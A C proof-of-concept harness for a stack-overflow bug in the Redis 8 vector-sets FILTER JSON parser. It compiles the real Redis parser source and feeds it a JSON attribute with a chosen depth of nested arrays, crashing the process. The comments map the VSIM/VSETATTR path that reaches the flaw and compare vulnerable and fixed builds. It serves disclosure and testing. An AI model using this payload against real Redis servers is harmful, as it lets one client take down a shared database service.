/* RedisRabbit — proof-of-concept harness for the Redis 8 vector-sets FILTER
 * JSON-parser unbounded-recursion stack overflow (CWE-674).
 *
 * This file does NOT reimplement the parser. It #includes the *verbatim*
 * Redis source files:
 *     src/expr.c      (the FILTER expression compiler + VM, real Redis code)
 *     src/fastjson.c  (the JSON field-value parser, included BY expr.c)
 *
 * The only thing we add is a thin shim for the RedisModule_* allocation API
 * (expr.c/fastjson.c are written against the Redis modules API) and a main()
 * that drives the exact code path a VSIM ... FILTER query reaches:
 *
 *   VSIM <key> ... FILTER ".f"        (client command)
 *     -> vectorSetFilterCallback()      vset.c:805   (per candidate item)
 *     -> exprRun(expr, json, json_len)  vset.c:811   (execute the program)
 *     -> jsonExtractField()             expr.c:764   (resolve the ".f" selector)
 *     -> jsonParseValueToken()          fastjson.c:333
 *     -> jsonParseArrayToken()          fastjson.c:270   (nested '[' arrays)
 *     -> jsonParseValueToken()          fastjson.c:286   (RECURSION, no depth cap)
 *
 * A JSON attribute like {"f": [[[[...]]]]} makes jsonParseValueToken /
 * jsonParseArrayToken recurse once per '[' with no depth limit, exhausting the
 * stack and crashing the whole redis-server process with SIGSEGV.
 */
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <assert.h>

/* --- RedisModule shims (expr.c / fastjson.c are written against these) --- */
void *RedisModule_Alloc(size_t n)   { return malloc(n); }
void *RedisModule_Realloc(void *p, size_t n) { return realloc(p, n); }
void  RedisModule_Free(void *p)     { free(p); }
char *RedisModule_Strdup(const char *s) { return strdup(s); }
#define RedisModule_Assert assert

/* Include the REAL Redis source. expr.c itself #includes fastjson.c.
 * VSET_EXPR_SRC selects the vulnerable (src/) or fixed (src-fixed/) tree so the
 * same harness drives both, showing the exact vuln-vs-fixed differential. */
#ifndef VSET_EXPR_SRC
#define VSET_EXPR_SRC "src/expr.c"
#endif
#include VSET_EXPR_SRC

int main(int argc, char **argv) {
    long depth = (argc >= 2) ? atol(argv[1]) : 100;

    /* Build the JSON attribute a client would store via VSETATTR / VADD SETATTR:
     *   {"f": [[[[ ... ]]]]}   with `depth` nested arrays under field "f".  */
    size_t jsonlen = 5 + (size_t)depth + (size_t)depth + 1; /* {"f": + '['*d + ']'*d + } */
    char *json = malloc(jsonlen + 1);
    char *p = json;
    memcpy(p, "{\"f\":", 5); p += 5;
    for (long i = 0; i < depth; i++) *p++ = '[';
    for (long i = 0; i < depth; i++) *p++ = ']';
    *p++ = '}';
    *p = '\0';

    /* Compile the FILTER expression ".f" (exactly what VSIM's FILTER option
     * does at vset.c:1116). */
    int errpos = 0;
    exprstate *es = exprCompile(".f", &errpos);
    if (es == NULL) {
        printf("compile failed at byte %d\n", errpos);
        return 2;
    }

    printf("depth=%ld  attribute=%zu bytes  -> running exprRun (FILTER '.f' on {\"f\": [[[[...]]]]})\n",
           depth, strlen(json));
    fflush(stdout);

    /* This is vset.c:811's exprRun(expr, json, json_len). For small depth it
     * returns; for large depth it recurses in jsonParseArrayToken() until the
     * stack is exhausted and the process dies with SIGSEGV. */
    int r = exprRun(es, json, strlen(json));
    printf("exprRun returned %d (no crash)\n", r);

    exprFree(es);
    free(json);
    return 0;
}
